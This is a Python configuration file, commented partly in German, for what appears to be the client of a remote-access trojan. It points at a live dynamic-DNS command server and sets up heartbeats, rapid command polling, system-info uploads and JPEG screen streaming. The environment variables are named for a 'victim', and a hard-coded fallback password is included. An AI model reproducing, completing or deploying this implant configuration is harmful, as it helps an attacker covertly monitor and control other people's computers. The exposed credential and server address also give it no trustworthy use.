import socket
import os

# DDNS Konfiguration
DDNS_HOSTNAME = "zyluxx.servehalflife.com"


def get_server_ip():
    """Hole Server-IP vom DDNS. Kein localhost-Fallback erlaubt."""
    try:
        ip = socket.gethostbyname(DDNS_HOSTNAME)
        print(f"[+] Server-IP vom DDNS: {ip}")
        return ip
    except Exception as e:
        raise RuntimeError(f"[!] DDNS-Auflösung fehlgeschlagen für {DDNS_HOSTNAME}: {e}")

# network configuration
EXTERNAL_IP = get_server_ip()  # Dynamisch vom DDNS

EXTERNAL_PORT = 50007  # ZMQ streaming port (unused by http)
INTERNAL_PORT = 5000   # HTTP control port

# choose which address to use for servers
SERVER_IP_ADDR = EXTERNAL_IP
SERVER_URL = f"http://{SERVER_IP_ADDR}:{INTERNAL_PORT}"
SERVER_IP = SERVER_IP_ADDR
ZMQ_SERVER_PORT = 5700  # Changed from 5555 to avoid conflicts

# credentials - aus Umgebungsvariable für Sicherheit
PASSWORD = os.getenv('XVICTIM_PASSWORD', 'HolyMal12334')  # Fallback für Tests, aber in Produktion setzen
SERVER_DOWNLOAD_TOKEN = os.getenv('XVICTIM_AUTH_TOKEN', os.getenv('HolyMal12334', PASSWORD))  # Token für /download/* Endpunkte auf dem Server

# host information
PC_NAME = socket.gethostname()

# various intervals (seconds)
HEARTBEAT_INTERVAL = 30
COMMAND_CHECK_INTERVAL = 0.1  # Für Localhost-Tests auf 0.1 senken!
AUTH_RETRY_INTERVAL = 3
SYSINFO_UPDATE_INTERVAL = 3600

# debugging options
DEBUG_STREAM = False  # if True, stream worker will log every frame and send/drop events

# streaming configuration
DEFAULT_STREAM_QUALITY = 100  # JPEG quality for ZMQ stream (0-100)
